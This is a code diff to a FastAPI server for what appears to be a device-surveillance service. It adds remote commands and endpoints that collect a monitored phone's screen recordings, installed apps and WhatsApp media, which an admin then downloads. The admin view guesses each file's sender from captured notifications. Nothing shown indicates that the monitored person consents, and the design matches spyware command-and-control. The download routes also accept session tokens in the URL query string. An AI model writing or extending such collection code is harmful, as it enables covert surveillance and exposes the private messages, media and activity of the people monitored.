@@ -270,6 +270,8 @@ VALID_REMOTE_COMMANDS = {
     "boost_location_frequency", "normal_location_frequency",
     "panic_mode_on", "panic_mode_off",
     "pull_contacts", "pull_call_logs", "pull_sms", "pull_media", "pull_all",
+    "pull_installed_apps", "pull_whatsapp_media",
+    "start_screen_record", "stop_screen_record",
 }
 
 class RemoteCommandRequest(BaseModel):
@@ -5599,6 +5601,133 @@ async def admin_get_video_thumbnail(
         raise HTTPException(status_code=500, detail="Failed to retrieve thumbnail")
 
 
+# ─── Screen Recording Endpoints ────────────────────────────────────────────────
+
+@app.post("/monitoring/screen-recording/upload")
+async def upload_screen_recording(
+    file: UploadFile = File(...),
+    session_id: str = Form(...),
+    chunk_index: int = Form(...),
+    admin_id: Optional[int] = Form(None),
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """App uploads screen recording chunk. Stored under video_recordings with context='screen_recording'."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+
+        upload_dir = "media_uploads/screen_recordings"
+        os.makedirs(upload_dir, exist_ok=True)
+
+        recording_id = str(uuid.uuid4())
+        file_path = os.path.join(upload_dir, f"{recording_id}.mp4")
+
+        content = await file.read()
+        with open(file_path, "wb") as f:
+            f.write(content)
+
+        import json
+        meta = json.dumps({"session_id": session_id, "chunk_index": chunk_index, "admin_id": admin_id})
+        rec = MonitoringService.save_video(
+            db, user_id, file_path, None, 0.0, len(content), meta, "screen_recording", False
+        )
+        return {"recording_id": int(rec.id), "status": "uploaded", "size_bytes": len(content)}
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Screen recording upload error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to upload screen recording")
+
+
+@app.get("/admin/monitoring/screen-recordings/{username}")
+async def admin_get_screen_recordings(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin lists screen recording chunks for a user."""
+    try:
+        target = db.query(User).filter(User.username == username, User.is_active == True).first()
+        if not target:
+            raise HTTPException(status_code=404, detail="User not found")
+
+        recs = db.query(VideoRecording).filter(
+            VideoRecording.user_id == int(target.id),
+            VideoRecording.context == "screen_recording"
+        ).order_by(VideoRecording.uploaded_at.desc()).all()
+
+        import json
+        result = []
+        for r in recs:
+            try:
+                meta = json.loads(r.resolution or "{}")
+            except Exception:
+                meta = {}
+            result.append({
+                "recording_id": int(r.id),
+                "session_id": meta.get("session_id"),
+                "chunk_index": meta.get("chunk_index"),
+                "admin_id": meta.get("admin_id"),
+                "file_size_bytes": r.file_size_bytes,
+                "uploaded_at": r.uploaded_at.isoformat(),
+                "downloaded_by_admin": r.downloaded_by_admin,
+            })
+        return result
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Get screen recordings error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve screen recordings")
+
+
+@app.get("/admin/monitoring/screen-recordings/download/{recording_id}")
+async def admin_download_screen_recording(
+    recording_id: int,
+    request: Request,
+    token: Optional[str] = None,
+    db: Session = Depends(get_database_session)
+):
+    """Admin downloads screen recording chunk. Accepts Bearer header OR ?token= for browser <video> src."""
+    raw_token = token
+    if not raw_token:
+        auth_header = request.headers.get("Authorization", "")
+        if auth_header.startswith("Bearer "):
+            raw_token = auth_header[7:]
+    if not raw_token:
+        raise HTTPException(status_code=401, detail="Missing token")
+    session = SessionService.validate_session(db, raw_token)
+    if not session:
+        raise HTTPException(status_code=401, detail="Invalid token")
+    user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
+    if not user or not user.is_admin:
+        raise HTTPException(status_code=403, detail="Admin only")
+    try:
+        rec = db.query(VideoRecording).filter(
+            VideoRecording.id == recording_id,
+            VideoRecording.context == "screen_recording"
+        ).first()
+        if not rec:
+            raise HTTPException(status_code=404, detail="Recording not found")
+        if not os.path.exists(rec.file_path):
+            raise HTTPException(status_code=404, detail="File not found on disk")
+
+        rec.downloaded_by_admin = True
+        rec.downloaded_at = datetime.utcnow()
+        db.commit()
+
+        from fastapi.responses import FileResponse
+        return FileResponse(
+            path=rec.file_path,
+            filename=f"screen_chunk_{recording_id}.mp4",
+            media_type="video/mp4"
+        )
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Download screen recording error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to download screen recording")
+
+
 # ─── Location Tracking Endpoints ───────────────────────────────────────────────
 
 @app.post("/monitoring/location/push")
@@ -5968,6 +6097,39 @@ async def device_upload_whatsapp(
         _json.dump(existing, f)
     return {"status": "ok", "new": len(new_msgs), "total": len(existing)}
 
+@app.post("/device-data/installed-apps")
+async def device_upload_installed_apps(
+    payload: Dict,
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads list of installed apps."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "installed_apps.json")
+    apps = payload.get("apps", [])
+    with open(path, "w") as f:
+        _json.dump({"apps": apps, "updated_at": datetime.utcnow().isoformat()}, f)
+    return {"status": "ok", "count": len(apps)}
+
+
+@app.get("/admin/device-data/{username}/installed-apps")
+async def admin_get_installed_apps(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    """Admin reads installed apps list for a user."""
+    import json as _json
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "installed_apps.json")
+    if not os.path.exists(path):
+        return {"apps": [], "updated_at": None}
+    with open(path) as f:
+        return _json.load(f)
+
+
 @app.get("/admin/device-data/{username}/whatsapp")
 async def admin_get_whatsapp(
     username: str,
@@ -5987,6 +6149,155 @@ async def admin_get_whatsapp(
         msgs = _json.load(f)
     # Return most recent `limit` messages, newest first
     return list(reversed(msgs[-limit:]))
+
+# ─── WhatsApp Media Endpoints ──────────────────────────────────────────────────
+
+@app.post("/device-data/whatsapp-media/upload")
+async def device_upload_whatsapp_media(
+    file: UploadFile = File(...),
+    filename: str = Form(...),
+    album: str = Form(...),
+    media_type: str = Form(...),
+    creation_time: Optional[float] = Form(None),
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads a WhatsApp media file. Stores file and metadata; correlates sender on read."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    media_dir = os.path.join(_user_data_dir(user_id), "whatsapp_media")
+    os.makedirs(media_dir, exist_ok=True)
+
+    ext = filename.rsplit('.', 1)[-1] if '.' in filename else 'bin'
+    upload_id = str(uuid.uuid4())
+    stored_filename = f"{upload_id}.{ext}"
+    file_path = os.path.join(media_dir, stored_filename)
+
+    content = await file.read()
+    with open(file_path, "wb") as f:
+        f.write(content)
+
+    index_path = os.path.join(_user_data_dir(user_id), "whatsapp_media_index.json")
+    index: list = []
+    if os.path.exists(index_path):
+        with open(index_path) as f:
+            try: index = _json.load(f)
+            except: index = []
+
+    received_at = datetime.utcfromtimestamp(creation_time / 1000).isoformat() if creation_time else datetime.utcnow().isoformat()
+    index.append({
+        "upload_id": upload_id,
+        "filename": filename,
+        "stored_filename": stored_filename,
+        "album": album,
+        "media_type": media_type,
+        "creation_time": creation_time,
+        "received_at": received_at,
+    })
+    # Keep last 500
+    index = index[-500:]
+    with open(index_path, "w") as f:
+        _json.dump(index, f)
+
+    return {"status": "ok", "upload_id": upload_id}
+
+
+@app.get("/admin/device-data/{username}/whatsapp-media")
+async def admin_get_whatsapp_media(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    """Admin retrieves WhatsApp media for a user, with sender correlation from notification history."""
+    import json as _json
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+
+    user_id = int(target.id)
+    index_path = os.path.join(_user_data_dir(user_id), "whatsapp_media_index.json")
+    notif_path = os.path.join(_user_data_dir(user_id), "whatsapp_notifications.json")
+
+    if not os.path.exists(index_path):
+        return []
+
+    with open(index_path) as f:
+        index = _json.load(f)
+
+    notifications = []
+    if os.path.exists(notif_path):
+        with open(notif_path) as f:
+            try: notifications = _json.load(f)
+            except: notifications = []
+
+    MEDIA_KEYWORDS = {"photo", "image", "video", "audio", "document", "gif", "sticker", "📷", "🎥", "🎵", "📄"}
+
+    media_notifs = [
+        n for n in notifications
+        if any(kw in (n.get("message") or "").lower() for kw in MEDIA_KEYWORDS)
+    ]
+
+    def find_sender(creation_time_ms):
+        if not creation_time_ms or not media_notifs:
+            return None
+        best = None
+        best_delta = float("inf")
+        for n in media_notifs:
+            ts = n.get("timestamp")
+            if not ts:
+                continue
+            delta = abs(ts - creation_time_ms)
+            if delta < best_delta and delta < 60_000:
+                best_delta = delta
+                best = n.get("sender")
+        return best
+
+    result = []
+    for entry in reversed(index):
+        sender = find_sender(entry.get("creation_time"))
+        result.append({**entry, "sender": sender})
+    return result
+
+
+@app.get("/admin/device-data/{username}/whatsapp-media/{stored_filename}")
+async def admin_download_whatsapp_media(
+    username: str,
+    stored_filename: str,
+    request: Request,
+    token: Optional[str] = None,
+    db: Session = Depends(get_database_session),
+):
+    """Admin downloads a WhatsApp media file. Accepts Bearer header OR ?token= query param."""
+    raw_token = token
+    if not raw_token:
+        auth_header = request.headers.get("Authorization", "")
+        if auth_header.startswith("Bearer "):
+            raw_token = auth_header[7:]
+    if not raw_token:
+        raise HTTPException(status_code=401, detail="Missing token")
+    session = SessionService.validate_session(db, raw_token)
+    if not session:
+        raise HTTPException(status_code=401, detail="Invalid token")
+    user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
+    if not user or not user.is_admin:
+        raise HTTPException(status_code=403, detail="Admin only")
+
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+
+    file_path = os.path.join(_user_data_dir(int(target.id)), "whatsapp_media", stored_filename)
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+
+    ext = stored_filename.rsplit('.', 1)[-1].lower() if '.' in stored_filename else ''
+    mime_map = {"mp4": "video/mp4", "mov": "video/quicktime", "jpg": "image/jpeg", "jpeg": "image/jpeg",
+                "png": "image/png", "gif": "image/gif", "webp": "image/webp",
+                "mp3": "audio/mpeg", "m4a": "audio/mp4", "ogg": "audio/ogg", "opus": "audio/ogg"}
+    media_type = mime_map.get(ext, "application/octet-stream")
+
+    from fastapi.responses import FileResponse
+    return FileResponse(path=file_path, media_type=media_type)
+
 
 # ─── Remote Command Endpoints ─────────────────────────────────────────────────
 
